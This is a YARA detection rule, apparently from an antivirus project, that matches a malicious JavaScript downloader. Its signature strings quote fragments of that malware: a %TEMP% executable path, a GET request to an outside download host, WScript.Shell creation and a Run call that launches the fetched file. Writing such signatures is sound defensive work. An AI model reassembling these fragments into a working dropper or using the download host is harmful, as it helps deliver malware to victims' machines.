rule sig_20160329_2527ad4a3eb091d3214f22a3ed584f1a {
  meta:
    description = "datamaliciousorder - file 20160329_2527ad4a3eb091d3214f22a3ed584f1a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a7599d5cd41340eefc53ca0b4174f62827d6c1e24752e544e629ce21d474cbc"

  strings:
    $s1  = "function Woxucu() {return Xcffxeqmxd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Lbu7jZcEnDDMx.exe\";};" fullword ascii
    $s2  = "Kloorqztti[Vhytboyfzj](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Nmnmzwjq](Tgxpsqmg() * 11)} while (Kloorqztti[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Cqwljq(Thcnrujwkf, Aifyhhrimm){return Thcnrujwkf - Aifyhhrimm;};" fullword ascii
    $s5  = "var Xcffxeqmxd = function Owxummit() {return WScript[Kwhzf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Hfjeufwua(Iiooqkipjt){Xcffxeqmxd[\"Run\"](Iiooqkipjt, Elensw, Elensw);};" fullword ascii
    $s7  = "function Donnwr() {return ((Nzsnlanw == true) && (Nzsnlanw == Vtiqiaj)) ? 1 : Elensw;};" fullword ascii
    $s8  = "return Cqwljq(Bshytf, Wrdku);" fullword ascii
    $s9  = "function Wnwsgww()" fullword ascii
    $s10 = "function Dafbhv(){return Qcebjfhjv;};" fullword ascii
    $s11 = " while (Anbhg){" fullword ascii
    $s12 = "function Fqrkumufmy(){return Kwhzf;};" fullword ascii
    $s13 = "function Kzdcgd(Nxvhx) {var Qoqdwvvih = (1, 2, 3, 4, 5, Nxvhx); return Qoqdwvvih;};" fullword ascii
    $s14 = "var Qxmnk = false;" fullword ascii
    $s15 = "var Nzsnlanw = false;" fullword ascii
    $s16 = "Nzsnlanw = true; " fullword ascii
    $s17 = "var Crjbmvmfo = new this[\"Date\"]();" fullword ascii
    $s18 = "function Tgxpsqmg(){return 22;};" fullword ascii
    $s19 = "Vtiqiaj = true; " fullword ascii
    $s20 = "var Vtiqiaj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}